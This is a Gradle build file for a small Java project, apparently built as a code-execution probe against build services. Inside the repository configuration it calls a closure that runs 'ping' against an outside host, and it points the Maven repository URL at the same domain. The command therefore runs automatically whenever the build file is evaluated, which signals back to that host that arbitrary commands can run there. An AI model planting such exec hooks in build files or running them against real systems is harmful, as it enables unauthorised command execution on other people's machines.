apply plugin: 'java'

def test = { ->
    exec {
        commandLine "ping", "-c", "1", "221231223.z.buglloc.com"
    }
}

repositories {
  maven {
    test()

    url 'http://' + '11test11.z.buglloc.com/' 
  }
}

dependencies {
  compile 'org.jdom:jdom:1.1.3'
}
